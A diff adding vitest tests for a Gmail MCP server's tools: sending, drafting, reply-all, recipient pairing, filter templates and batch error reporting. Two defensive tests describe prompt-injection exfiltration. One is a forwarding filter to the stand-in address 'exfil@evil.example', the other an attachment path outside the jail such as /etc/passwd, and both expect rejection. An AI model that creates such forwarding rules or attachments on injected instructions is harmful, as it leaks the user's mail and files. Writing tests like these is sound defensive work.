@@ -16,7 +16,7 @@
  */
 
 import { describe, it, expect, beforeEach, afterEach } from "vitest";
-import { mkdtempSync, rmSync, readdirSync } from "node:fs";
+import { mkdtempSync, rmSync, readdirSync, readFileSync, existsSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { gmail_v1 } from "googleapis";
@@ -34,13 +34,27 @@ import { resetJailDirCache } from "../utl.js";
 // download tests in PR #6 do not write to one another's directories.
 let stateDir: string;
 let downloadDir: string;
+let attachmentDir: string;
+let pairedPath: string;
 const originalEnv = { ...process.env };
 
 beforeEach(() => {
   stateDir = mkdtempSync(join(tmpdir(), "gmail-mcp-registrars-test-"));
   downloadDir = mkdtempSync(join(tmpdir(), "gmail-mcp-download-test-"));
+  // Send-email attachment jail. Defaults to `~/GmailAttachments/` in
+  // production; pin per-test to a tempdir so the host's real
+  // attachment dir is never touched and each test gets an isolated
+  // realpath-resolved jail root.
+  attachmentDir = mkdtempSync(join(tmpdir(), "gmail-mcp-attach-test-"));
+  // pair_recipient writes to GMAIL_MCP_PAIRED_PATH — point it at a
+  // file inside the temp state-dir so each test gets a fresh
+  // allowlist and the host's real ~/.gmail-mcp/paired.json is never
+  // touched.
+  pairedPath = join(stateDir, "paired.json");
+  process.env.GMAIL_MCP_PAIRED_PATH = pairedPath;
   process.env.GMAIL_MCP_STATE_DIR = stateDir;
   process.env.GMAIL_MCP_DOWNLOAD_DIR = downloadDir;
+  process.env.GMAIL_MCP_ATTACHMENT_DIR = attachmentDir;
   delete process.env.GMAIL_MCP_RATE_LIMIT_DISABLE;
   for (const k of Object.keys(process.env)) {
     if (k.startsWith("GMAIL_MCP_RATE_LIMIT_") && k !== "GMAIL_MCP_RATE_LIMIT_DISABLE") {
@@ -54,6 +68,7 @@ beforeEach(() => {
 afterEach(() => {
   rmSync(stateDir, { recursive: true, force: true });
   rmSync(downloadDir, { recursive: true, force: true });
+  rmSync(attachmentDir, { recursive: true, force: true });
   process.env = { ...originalEnv };
   resetRateLimitHistory();
   resetJailDirCache();
@@ -65,6 +80,9 @@ interface MockedGmailCalls {
   messageList: Array<unknown>;
   messageModify: Array<unknown>;
   attachmentGet: Array<unknown>;
+  messageSend: Array<unknown>;
+  draftCreate: Array<unknown>;
+  getProfile: Array<unknown>;
   threadModify: Array<unknown>;
   threadGet: Array<unknown>;
   threadList: Array<unknown>;
@@ -76,6 +94,7 @@ interface MockedGmailCalls {
   labelCreate: Array<unknown>;
   labelUpdate: Array<unknown>;
   labelList: Array<unknown>;
+  sendAsList: Array<unknown>;
 }
 
 interface MockGmailOpts {
@@ -124,6 +143,23 @@ interface MockGmailOpts {
    * Used to exercise the empty-list branch in `list_filters`.
    */
   noFilters?: boolean;
+  /**
+   * When set to a numeric HTTP status, `gmail.users.messages.get` (and
+   * `attachments.get`) throw an Error with `.code = <status>` so the
+   * `asGmailApiError` formatter prefixes the failure with `(HTTP <status>)`.
+   * Pins the HTTP-error branch in `download_email` / `download_attachment`.
+   */
+  messageGetHttpError?: number;
+  attachmentGetHttpError?: number;
+  /**
+   * When set, `gmail.users.messages.modify` and
+   * `gmail.users.messages.delete` throw a generic Error for any
+   * `id` listed here. Pins the per-item failure-collection branch in
+   * `batch_modify_emails` / `batch_delete_emails`
+   * (`processBatches` records `failures[]` and the registrar prints
+   * the "Failed to … N messages" footer).
+   */
+  failOnIds?: string[];
 }
 
 function mockGmail(opts: MockGmailOpts = {}): {
@@ -135,6 +171,9 @@ function mockGmail(opts: MockGmailOpts = {}): {
     messageGet: [],
     messageList: [],
     messageModify: [],
+    messageSend: [],
+    draftCreate: [],
+    getProfile: [],
     attachmentGet: [],
     threadModify: [],
     threadGet: [],
@@ -147,6 +186,7 @@ function mockGmail(opts: MockGmailOpts = {}): {
     labelCreate: [],
     labelUpdate: [],
     labelList: [],
+    sendAsList: [],
   };
   const client = {
     users: {
@@ -154,6 +194,11 @@ function mockGmail(opts: MockGmailOpts = {}): {
         attachments: {
           get: async (params: unknown) => {
             calls.attachmentGet.push(params);
+            if (opts.attachmentGetHttpError !== undefined) {
+              const err: Error & { code?: number } = new Error("Simulated Gmail API failure");
+              err.code = opts.attachmentGetHttpError;
+              throw err;
+            }
             const data =
               opts.attachmentData ??
               Buffer.from("%PDF-1.4 fake pdf content", "utf-8").toString("base64url");
@@ -162,14 +207,31 @@ function mockGmail(opts: MockGmailOpts = {}): {
         },
         delete: async (params: unknown) => {
           calls.messageDelete.push(params);
+          const id = (params as { id?: string }).id;
+          if (id !== undefined && opts.failOnIds?.includes(id)) {
+            throw new Error(`Simulated delete failure for ${id}`);
+          }
           return { data: {} };
         },
         modify: async (params: unknown) => {
           calls.messageModify.push(params);
+          const id = (params as { id?: string }).id;
+          if (id !== undefined && opts.failOnIds?.includes(id)) {
+            throw new Error(`Simulated modify failure for ${id}`);
+          }
           return { data: {} };
+        },
+        send: async (params: unknown) => {
+          calls.messageSend.push(params);
+          return { data: { id: `msg_sent_${calls.messageSend.length}` } };
         },
         get: async (params: unknown) => {
           calls.messageGet.push(params);
+          if (opts.messageGetHttpError !== undefined) {
+            const err: Error & { code?: number } = new Error("Simulated Gmail API failure");
+            err.code = opts.messageGetHttpError;
+            throw err;
+          }
           const id = (params as { id?: string }).id ?? "msg_unknown";
           const format = (params as { format?: string }).format ?? "full";
           // Reject unsupported formats so the test fixture does not
@@ -231,6 +293,19 @@ function mockGmail(opts: MockGmailOpts = {}): {
             data: { messages: items.map((m) => ({ id: m.id, threadId: `thread_${m.id}` })) },
           };
         },
+      },
+      drafts: {
+        create: async (params: unknown) => {
+          calls.draftCreate.push(params);
+          return { data: { id: `draft_${calls.draftCreate.length}` } };
+        },
+      },
+      // reply_all uses getProfile to figure out which address to drop
+      // from the recipient list (so the user is not CC'd on their own
+      // reply).
+      getProfile: async (params: unknown) => {
+        calls.getProfile.push(params);
+        return { data: { emailAddress: "me@example.com" } };
       },
       threads: {
         modify: async (params: unknown) => {
@@ -322,6 +397,17 @@ function mockGmail(opts: MockGmailOpts = {}): {
         },
       },
       settings: {
+        // resolveDefaultSender (used by sendOrDraftEmail when `from`
+        // is empty) calls users.settings.sendAs.list — return one
+        // default sendAs so the resolver picks `me@example.com`.
+        sendAs: {
+          list: async (params: unknown) => {
+            calls.sendAsList.push(params);
+            return {
+              data: { sendAs: [{ sendAsEmail: "me@example.com", isDefault: true }] },
+            };
+          },
+        },
         filters: {
           delete: async (params: unknown) => {
             calls.filterDelete.push(params);
@@ -591,6 +677,30 @@ describe("PR #4 registrars — label management", () => {
     }
   });
 
+  it("update_label forwards messageListVisibility + labelListVisibility when supplied", async () => {
+    // Pin the two if-branches in `src/tools/labels.ts:86-91` that
+    // assemble the partial-update body. Without this, a regression
+    // that drops either field from the merge silently swallows
+    // visibility changes on the wire.
+    await withFix(["gmail.modify", "gmail.labels"], async (fix) => {
+      await fix.client.callTool({
+        name: "update_label",
+        arguments: {
+          id: "Label_2",
+          messageListVisibility: "hide",
+          labelListVisibility: "labelHide",
+        },
+      });
+      expect(fix.calls.labelUpdate).toHaveLength(1);
+      const body = (fix.calls.labelUpdate[0] as { requestBody: Record<string, unknown> })
+        .requestBody;
+      expect(body.messageListVisibility).toBe("hide");
+      expect(body.labelListVisibility).toBe("labelHide");
+      // No name supplied → it stays unset on the wire.
+      expect(body.name).toBeUndefined();
+    });
+  });
+
   it("get_or_create_label returns 'found existing' when the label is already present", async () => {
     const fix = await buildAndConnect(["gmail.modify", "gmail.labels"], {
       existingLabels: [{ id: "Label_existing", name: "Acme/Invoices", type: "user" }],
@@ -667,6 +777,36 @@ describe("PR #4 registrars — filter management", () => {
       expect(fix.calls.filterCreate).toHaveLength(1);
     } finally {
       await fix.close();
+    }
+  });
+
+  it("create_filter rejects an action.forward target that is not in the paired allowlist", async () => {
+    // Pin the recipient-pairing gate at `src/tools/filters.ts:79-81`
+    // — installing a server-side forwarding rule must require the
+    // destination to be paired (mirrors send_email / reply_all /
+    // draft_email). Without this branch tested, a regression that
+    // drops the `requirePairedRecipients` call silently re-opens
+    // the prompt-injection-driven exfiltration channel on the
+    // create_filter surface.
+    process.env.GMAIL_MCP_RECIPIENT_PAIRING = "true";
+    try {
+      await withFix(["gmail.settings.basic"], async (fix) => {
+        const result = (await fix.client.callTool({
+          name: "create_filter",
+          arguments: {
+            criteria: { from: "noreply@vendor.com" },
+            action: { forward: "exfil@evil.example" },
+          },
+        })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+        expect(result.isError).toBe(true);
+        // Pairing-violation messages mention the unpaired address.
+        expect(result.content[0]?.text).toContain("exfil@evil.example");
+        // No filterCreate call was issued — the throw fires before
+        // the API call.
+        expect(fix.calls.filterCreate).toHaveLength(0);
+      });
+    } finally {
+      delete process.env.GMAIL_MCP_RECIPIENT_PAIRING;
     }
   });
 
@@ -955,6 +1095,81 @@ describe("PR #5 registrars — modify_email + batch_*", () => {
       expect(fix.calls.messageDelete).toHaveLength(2);
     });
   });
+
+  it("batch_modify_emails reports per-item failures separately from successes", async () => {
+    // Pin the failure-collection branch in `batch_modify_emails`
+    // (`src/tools/messages.ts:240-243`): when `processBatches`
+    // records `failures[]`, the registrar prints the success count
+    // PLUS the "Failed to process: N messages" footer with the
+    // truncated failed IDs. Without this branch tested, a regression
+    // that drops the failure footer (or that mis-counts the
+    // partition) still passes the success-only assertions above.
+    await withFix(
+      ["gmail.modify"],
+      async (fix) => {
+        const result = (await fix.client.callTool({
+          name: "batch_modify_emails",
+          arguments: {
+            messageIds: ["good_a", "fail_b", "good_c"],
+            addLabelIds: ["L_X"],
+            batchSize: 5,
+          },
+        })) as { content: Array<{ type: string; text: string }> };
+        const text = result.content[0]?.text ?? "";
+        expect(text).toContain("Successfully processed: 2 messages");
+        expect(text).toContain("Failed to process: 1 messages");
+        expect(text).toContain("Failed message IDs:");
+        // The failed-ID renderer truncates each id to 16 chars and
+        // appends `...` — pin the truncation contract.
+        expect(text).toContain("fail_b...");
+        expect(text).toContain("(Simulated modify failure for fail_b)");
+        // `processBatches` retries the whole batch item-by-item on a
+        // failure (so 3 batch calls + 3 retry calls = 6 modify calls
+        // for a 3-item input with one bad ID). Pin the lower bound
+        // (>=3) to allow `processBatches` to optimise away the
+        // retry one day, and pin that `fail_b` was actually
+        // attempted (so a regression that drops the bad ID before
+        // the API call is caught).
+        expect(fix.calls.messageModify.length).toBeGreaterThanOrEqual(3);
+        const modifiedIds = fix.calls.messageModify.map((c) => (c as { id?: string }).id);
+        expect(modifiedIds).toContain("good_a");
+        expect(modifiedIds).toContain("good_c");
+        expect(modifiedIds).toContain("fail_b");
+      },
+      { failOnIds: ["fail_b"] },
+    );
+  });
+
+  it("batch_delete_emails reports per-item failures separately from successes", async () => {
+    // Same shape as the batch_modify failure test above, against
+    // `src/tools/messages.ts:275-278`. Distinct branch: a regression
+    // that copies the modify-arm's footer logic but mishandles the
+    // delete-arm wording (e.g., "Failed to process" instead of
+    // "Failed to delete") would fail this test, not the modify one.
+    await withFix(
+      ["mail.google.com"],
+      async (fix) => {
+        const result = (await fix.client.callTool({
+          name: "batch_delete_emails",
+          arguments: { messageIds: ["m1", "m2", "fail_3"] },
+        })) as { content: Array<{ type: string; text: string }> };
+        const text = result.content[0]?.text ?? "";
+        expect(text).toContain("Successfully deleted: 2 messages");
+        expect(text).toContain("Failed to delete: 1 messages");
+        expect(text).toContain("fail_3...");
+        expect(text).toContain("(Simulated delete failure for fail_3)");
+        // Same retry-on-batch-failure semantics as the modify test
+        // above — pin the lower bound + verify each ID was
+        // attempted at least once.
+        expect(fix.calls.messageDelete.length).toBeGreaterThanOrEqual(3);
+        const deletedIds = fix.calls.messageDelete.map((c) => (c as { id?: string }).id);
+        expect(deletedIds).toContain("m1");
+        expect(deletedIds).toContain("m2");
+        expect(deletedIds).toContain("fail_3");
+      },
+      { failOnIds: ["fail_3"] },
+    );
+  });
 });
 
 describe("PR #6 registrars — download_email + download_attachment", () => {
@@ -1101,6 +1316,593 @@ describe("PR #6 registrars — get_thread + list_inbox_threads + get_inbox_with_
         expect(text).toContain("Body 3");
       },
       { threads: fixtureThreads },
+    );
+  });
+});
+
+describe("PR #7 registrars — send_email / draft_email (messaging.ts)", () => {
+  it("send_email forwards a base64url-encoded RFC822 payload to gmail.users.messages.send", async () => {
+    await withFix(["gmail.send"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "send_email",
+        arguments: {
+          to: ["bob@example.com"],
+          subject: "Hello from test",
+          body: "This is the test body.",
+          from: "me@example.com",
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("sent successfully");
+      expect(result.content[0]?.text).toContain("msg_sent_1");
+      expect(fix.calls.messageSend).toHaveLength(1);
+      const sent = fix.calls.messageSend[0] as { requestBody: { raw: string } };
+      expect(typeof sent.requestBody.raw).toBe("string");
+      // Decode the base64url and check the headers landed in the MIME.
+      const decoded = Buffer.from(sent.requestBody.raw, "base64url").toString("utf-8");
+      expect(decoded).toContain("To: bob@example.com");
+      expect(decoded).toContain("Subject: Hello from test");
+      expect(decoded).toContain("This is the test body.");
+    });
+  });
+
+  it("draft_email routes through gmail.users.drafts.create instead of messages.send", async () => {
+    await withFix(["gmail.compose"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "draft_email",
+        arguments: {
+          to: ["alice@example.com"],
+          subject: "Draft subject",
+          body: "Draft body",
+          from: "me@example.com",
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("draft created");
+      expect(fix.calls.draftCreate).toHaveLength(1);
+      expect(fix.calls.messageSend).toHaveLength(0);
+    });
+  });
+
+  it("send_email with an in-jail attachment routes through Nodemailer + messages.send", async () => {
+    await withFix(["gmail.send"], async (fix) => {
+      // Drop a real PDF inside the per-test attachment jail so the
+      // jail check (`assertAttachmentPathAllowed`) accepts it.
+      // Nodemailer reads the file at send-time via its streaming
+      // transport, so the bytes have to actually exist on disk —
+      // a fake / non-existent path would fail at `fs.existsSync`.
+      const pdfPath = join(attachmentDir, "report.pdf");
+      writeFileSync(pdfPath, "%PDF-1.4\n%fake pdf payload for the test\n");
+
+      const result = (await fix.client.callTool({
+        name: "send_email",
+        arguments: {
+          to: ["bob@example.com"],
+          subject: "With attachment",
+          body: "See attached.",
+          from: "me@example.com",
+          attachments: [pdfPath],
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("sent successfully");
+      expect(fix.calls.messageSend).toHaveLength(1);
+      const sent = fix.calls.messageSend[0] as { requestBody: { raw: string } };
+      const decoded = Buffer.from(sent.requestBody.raw, "base64url").toString("utf-8");
+      // Pin two contracts that fall through Nodemailer's streaming
+      // MIME builder when attachments > 0: the multipart envelope
+      // (`Content-Type: multipart/...`) and the per-attachment
+      // disposition with the original `path.basename(filePath)`
+      // filename.
+      expect(decoded).toMatch(/Content-Type: multipart\//);
+      // Nodemailer emits unquoted filenames for ASCII-safe basenames:
+      // `Content-Disposition: attachment; filename=report.pdf`. Pin
+      // both the disposition AND the basename so a regression that
+      // drops `path.basename(filePath)` (and leaks the full
+      // attachment-jail path) is caught.
+      expect(decoded).toMatch(/Content-Disposition: attachment; filename=report\.pdf/);
+      // The base64-encoded PDF body lands inline in the part — pin
+      // a deterministic prefix so a regression that drops the
+      // attachment payload entirely (zero-byte attachment) fails.
+      expect(decoded).toContain("JVBERi0xLjQK"); // %PDF-1.4\n base64 prefix
+      // Headers still travel correctly through this branch (separate
+      // code path from the no-attachment Buffer-build path above).
+      expect(decoded).toContain("To: bob@example.com");
+      expect(decoded).toContain("Subject: With attachment");
+    });
+  });
+
+  it("send_email rejects an attachment outside the jail with the override hint", async () => {
+    await withFix(["gmail.send"], async (fix) => {
+      // Drop a file in a sibling tempdir — outside the configured
+      // GMAIL_MCP_ATTACHMENT_DIR. The path is absolute and the file
+      // exists, so the rejection comes from `assertInsideJail` (not
+      // from the absolute-path or existsSync guards earlier in
+      // `assertAttachmentPathAllowed`). Pins the prompt-injection
+      // defence: an LLM prompt that names `/etc/passwd` (or any
+      // out-of-jail path) cannot exfiltrate via send_email.
+      const outsidePath = join(downloadDir, "out-of-jail.txt");
+      writeFileSync(outsidePath, "This file is outside the attachment jail.");
+
+      const result = (await fix.client.callTool({
+        name: "send_email",
+        arguments: {
+          to: ["bob@example.com"],
+          subject: "Should be rejected",
+          body: "x",
+          from: "me@example.com",
+          attachments: [outsidePath],
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBe(true);
+      expect(result.content[0]?.text).toContain("outside the allowed");
+      // The override hint names the env var so the operator knows
+      // how to widen the jail if intentional.
+      expect(result.content[0]?.text).toContain("GMAIL_MCP_ATTACHMENT_DIR");
+      // No Gmail call was issued — short-circuited inside Nodemailer.
+      expect(fix.calls.messageSend).toHaveLength(0);
+    });
+  });
+
+  it("draft_email with an in-jail attachment routes through drafts.create (not messages.send)", async () => {
+    await withFix(["gmail.compose"], async (fix) => {
+      const pdfPath = join(attachmentDir, "draft.pdf");
+      writeFileSync(pdfPath, "%PDF-1.4\n%fake pdf for the draft test\n");
+
+      const result = (await fix.client.callTool({
+        name: "draft_email",
+        arguments: {
+          to: ["alice@example.com"],
+          subject: "Draft with attachment",
+          body: "Draft body",
+          from: "me@example.com",
+          attachments: [pdfPath],
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("draft created");
+      // Pin that the attachment-bearing draft path lands on
+      // `drafts.create` (NOT `messages.send`) — distinct from the
+      // attachment-bearing send path tested above. A regression
+      // that flips the if/else on `action === "send"` would silently
+      // send the draft.
+      expect(fix.calls.draftCreate).toHaveLength(1);
+      expect(fix.calls.messageSend).toHaveLength(0);
+      // The Nodemailer-built RFC822 lives at requestBody.message.raw
+      // for drafts (one extra wrapper level vs send).
+      const draft = fix.calls.draftCreate[0] as {
+        requestBody: { message: { raw: string } };
+      };
+      const decoded = Buffer.from(draft.requestBody.message.raw, "base64url").toString("utf-8");
+      expect(decoded).toMatch(/Content-Type: multipart\//);
+      expect(decoded).toMatch(/Content-Disposition: attachment; filename=draft\.pdf/);
+    });
+  });
+
+  it("send_email forwards threadId when supplied (preserves threading on the wire)", async () => {
+    await withFix(["gmail.send"], async (fix) => {
+      await fix.client.callTool({
+        name: "send_email",
+        arguments: {
+          to: ["bob@example.com"],
+          subject: "Re: Project",
+          body: "Reply body",
+          from: "me@example.com",
+          threadId: "thread_xyz",
+          inReplyTo: "<orig@example.com>",
+        },
+      });
+      const sent = fix.calls.messageSend[0] as { requestBody: { threadId?: string } };
+      expect(sent.requestBody.threadId).toBe("thread_xyz");
+    });
+  });
+});
+
+describe("PR #7 registrars — pair_recipient", () => {
+  it("list returns the empty allowlist when no addresses have been paired", async () => {
+    await withFix(["gmail.modify"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "pair_recipient",
+        arguments: { action: "list" },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      // Pin the exact handler wording so a wording change is caught.
+      // Source of truth: src/tools/messaging.ts:71-79.
+      const text = result.content[0]?.text ?? "";
+      expect(text).toContain("Paired recipients (0):");
+      expect(text).toContain("(none)");
+    });
+  });
+
+  it("add → list round-trip persists the address through GMAIL_MCP_PAIRED_PATH", async () => {
+    await withFix(["gmail.modify"], async (fix) => {
+      const addRes = (await fix.client.callTool({
+        name: "pair_recipient",
+        arguments: { action: "add", email: "trusted@example.com" },
+      })) as { content: Array<{ type: string; text: string }> };
+      // Pin the exact "Added X to the paired allowlist." wording.
+      expect(addRes.content[0]?.text).toContain(
+        'Added "trusted@example.com" to the paired allowlist.',
+      );
+
+      const listRes = (await fix.client.callTool({
+        name: "pair_recipient",
+        arguments: { action: "list" },
+      })) as { content: Array<{ type: string; text: string }> };
+      // Count went from 0 to 1, and the address appears as "  - …".
+      expect(listRes.content[0]?.text).toContain("Paired recipients (1):");
+      expect(listRes.content[0]?.text).toContain("  - trusted@example.com");
+      // CR finding: prove the GMAIL_MCP_PAIRED_PATH override is wired
+      // through to the on-disk store. Without this, both the add and
+      // the list could silently route to ~/.gmail-mcp/paired.json on
+      // the host and the round-trip text assertions would still pass.
+      // Pin the file at `pairedPath` exists, parses, and contains the
+      // address (lowercased per the recipient-pairing.ts contract).
+      expect(existsSync(pairedPath)).toBe(true);
+      const parsed = JSON.parse(readFileSync(pairedPath, "utf-8")) as {
+        version: number;
+        addresses: string[];
+        updatedAt: string;
+      };
+      expect(parsed.version).toBe(1);
+      expect(parsed.addresses).toContain("trusted@example.com");
+      expect(typeof parsed.updatedAt).toBe("string");
+    });
+  });
+
+  it("remove drops a previously-paired address", async () => {
+    await withFix(["gmail.modify"], async (fix) => {
+      await fix.client.callTool({
+        name: "pair_recipient",
+        arguments: { action: "add", email: "ephemeral@example.com" },
+      });
+      const removeRes = (await fix.client.callTool({
+        name: "pair_recipient",
+        arguments: { action: "remove", email: "ephemeral@example.com" },
+      })) as { content: Array<{ type: string; text: string }> };
+      // Pin the exact "Removed X from the paired allowlist." wording.
+      expect(removeRes.content[0]?.text).toContain(
+        'Removed "ephemeral@example.com" from the paired allowlist.',
+      );
+      // CR finding: the success-text alone would still pass if the
+      // handler logged the removal but never updated the backing
+      // store. Pin the actual state change two ways: the tool's own
+      // `list` action returns "(none)" + a count of 0, AND the
+      // on-disk JSON at pairedPath either contains an empty
+      // `addresses` array or has been removed entirely.
+      const listRes = (await fix.client.callTool({
+        name: "pair_recipient",
+        arguments: { action: "list" },
+      })) as { content: Array<{ type: string; text: string }> };
+      expect(listRes.content[0]?.text).not.toContain("ephemeral@example.com");
+      expect(listRes.content[0]?.text).toContain("(none)");
+      if (existsSync(pairedPath)) {
+        const parsed = JSON.parse(readFileSync(pairedPath, "utf-8")) as {
+          addresses: string[];
+        };
+        expect(parsed.addresses).not.toContain("ephemeral@example.com");
+      }
+    });
+  });
+
+  it("remove without an email argument returns isError with a descriptive message", async () => {
+    await withFix(["gmail.modify"], async (fix) => {
+      // pair_recipient's runtime `!email` guard fires AFTER Zod parse
+      // and is shared between the `add` and `remove` arms. Calling
+      // with `action: "remove"` and NO `email` field hits the same
+      // shared guard — the Zod schema accepts the missing email on
+      // `remove` (since some allowlist UIs surface a remove-by-id
+      // shape), then the handler's runtime check rejects it with
+      // the "requires an `email` argument" message. Pinning that
+      // wording locks the contract on the user-visible error
+      // surface.
+      const result = (await fix.client.callTool({
+        name: "pair_recipient",
+        arguments: { action: "remove" },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBe(true);
+      expect(result.content[0]?.text).toContain("requires an `email` argument");
+    });
+  });
+});
+
+describe("PR #7 registrars — reply_all", () => {
+  it("fetches the original, builds the recipient list, and sends via sendOrDraftEmail", async () => {
+    await withFix(["gmail.send", "gmail.readonly"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "reply_all",
+        arguments: {
+          messageId: "msg_orig",
+          body: "Thanks for the heads-up!",
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("Reply-all sent successfully");
+      // gmail.users.messages.get fetched the original; getProfile
+      // fetched my own address; messages.send sent the reply.
+      expect(fix.calls.messageGet).toHaveLength(1);
+      expect(fix.calls.getProfile).toHaveLength(1);
+      expect(fix.calls.messageSend).toHaveLength(1);
+      // Pin the recipient filter on the encoded RFC822 payload, not
+      // the user-facing status text — the success message is just a
+      // log line, the actual `To:`/`Cc:` headers ride on
+      // `requestBody.raw`. A regression that drops the
+      // `me@example.com` filter from `buildReplyAllRecipients` would
+      // still produce a "Reply-all sent successfully" message but
+      // would silently CC the user themselves.
+      const sent = fix.calls.messageSend[0] as { requestBody: { raw: string } };
+      const decoded = Buffer.from(sent.requestBody.raw, "base64url").toString("utf-8");
+      expect(decoded).toContain("alice@example.com");
+      // me@example.com legitimately appears in `From:` (the sender);
+      // what must NOT happen is buildReplyAllRecipients leaving it
+      // in `To:` or `Cc:` — that would CC the user themselves on
+      // their own reply. Pin that contract on the recipient lines
+      // only, not the whole MIME blob.
+      const toLine = /^To:\s*(.+)$/m.exec(decoded)?.[1] ?? "";
+      const ccLine = /^Cc:\s*(.+)$/m.exec(decoded)?.[1] ?? "";
+      const fromLine = /^From:\s*(.+)$/m.exec(decoded)?.[1] ?? "";
+      expect(toLine).not.toContain("me@example.com");
+      expect(ccLine).not.toContain("me@example.com");
+      // CR finding: the `from` arg was omitted, so the only way
+      // `From:` ends up populated is via `resolveDefaultSender()` →
+      // `users.settings.sendAs.list`. Pin both the call AND the
+      // resulting MIME stamp so a regression that drops the resolver
+      // (or that mis-wires its result) cannot pass this test.
+      expect(fix.calls.sendAsList).toHaveLength(1);
+      expect(fromLine).toContain("me@example.com");
+    });
+  });
+});
+
+describe("PR #4 registrars — filter templates (4 paths)", () => {
+  it("create_filter_from_template (withSubject) pins criteria.subject + action.addLabelIds on the wire", async () => {
+    await withFix(["gmail.settings.basic"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "create_filter_from_template",
+        arguments: {
+          template: "withSubject",
+          parameters: { subjectText: "[Newsletter]", labelIds: ["Label_news"] },
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("withSubject");
+      // CR finding: pin the template-specific wiring on the actual
+      // filterCreate request body. Without this, a regression that
+      // mis-maps `withSubject` to `from:` (or drops `addLabelIds`)
+      // still passes the success-text-only check.
+      expect(fix.calls.filterCreate).toHaveLength(1);
+      const body = (
+        fix.calls.filterCreate[0] as {
+          requestBody: {
+            criteria: { subject?: string; from?: string };
+            action: { addLabelIds?: string[] };
+          };
+        }
+      ).requestBody;
+      expect(body.criteria).toMatchObject({ subject: "[Newsletter]" });
+      expect(body.criteria.from).toBeUndefined();
+      expect(body.action.addLabelIds).toEqual(["Label_news"]);
+    });
+  });
+
+  it("create_filter_from_template (largeEmails) pins criteria.size + sizeComparison on the wire", async () => {
+    await withFix(["gmail.settings.basic"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "create_filter_from_template",
+        arguments: {
+          template: "largeEmails",
+          parameters: { sizeInBytes: 5_000_000, labelIds: ["Label_big"] },
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("largeEmails");
+      // CR finding: pin both the size threshold and the comparison
+      // direction. A regression that flips `larger` → `smaller` (or
+      // drops the comparison entirely) would silently invert the
+      // filter's intent and still pass a count-only check.
+      expect(fix.calls.filterCreate).toHaveLength(1);
+      const body = (
+        fix.calls.filterCreate[0] as {
+          requestBody: {
+            criteria: { size?: number; sizeComparison?: string };
+            action: { addLabelIds?: string[] };
+          };
+        }
+      ).requestBody;
+      expect(body.criteria).toMatchObject({ size: 5_000_000, sizeComparison: "larger" });
+      expect(body.action.addLabelIds).toEqual(["Label_big"]);
+    });
+  });
+
+  it("create_filter_from_template (containingText) propagates markImportant on the wire", async () => {
+    await withFix(["gmail.settings.basic"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "create_filter_from_template",
+        arguments: {
+          template: "containingText",
+          parameters: { searchText: "urgent", labelIds: ["Label_urg"], markImportant: true },
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("containingText");
+      // Pin the actual filter payload — without this assertion a
+      // regression that silently drops `markImportant` from the
+      // template-to-action mapping would still pass the success-text
+      // check. `filterTemplates.containingText(text, labels, true)`
+      // appends the system "IMPORTANT" label to the user labels.
+      expect(fix.calls.filterCreate).toHaveLength(1);
+      const body = (
+        fix.calls.filterCreate[0] as { requestBody: { action: { addLabelIds?: string[] } } }
+      ).requestBody;
+      expect(body.action.addLabelIds).toEqual(expect.arrayContaining(["Label_urg", "IMPORTANT"]));
+    });
+  });
+
+  it("create_filter_from_template (mailingList) pins criteria.query + INBOX-archive on the wire", async () => {
+    await withFix(["gmail.settings.basic"], async (fix) => {
+      const result = (await fix.client.callTool({
+        name: "create_filter_from_template",
+        arguments: {
+          template: "mailingList",
+          parameters: { listIdentifier: "discuss@example.com", labelIds: ["Label_list"] },
+        },
+      })) as { content: Array<{ type: string; text: string }>; isError?: boolean };
+      expect(result.isError).toBeFalsy();
+      expect(result.content[0]?.text).toContain("mailingList");
+      // CR finding: pin the dual-shape Gmail query (List-Id +
+      // bracketed Subject) AND the INBOX-removal that the template's
+      // `archive=true` default produces. A regression that drops
+      // either branch of the OR (or that forgets to archive) still
+      // passes the success-text-only check.
+      expect(fix.calls.filterCreate).toHaveLength(1);
+      const body = (
+        fix.calls.filterCreate[0] as {
+          requestBody: {
+            criteria: { query?: string };
+            action: { addLabelIds?: string[]; removeLabelIds?: string[] };
+          };
+        }
+      ).requestBody;
+      expect(body.criteria.query).toBe("list:discuss@example.com OR subject:[discuss@example.com]");
+      expect(body.action.addLabelIds).toEqual(["Label_list"]);
+      expect(body.action.removeLabelIds).toEqual(["INBOX"]);
+    });
+  });
+
+  it("create_filter_from_template surfaces a parameter-missing error as isError=true", async () => {
+    await withFix(["gmail.settings.basic"], async (fix) => {
+      // `withSubject` requires `subjectText`. Omitting it should
+      // make the tool throw, which wrapToolHandler maps to
+      // `isError: true`.
+      const result = (await fix.client.callTool({
+        name: "create_filter_from_template",
+        arguments: {
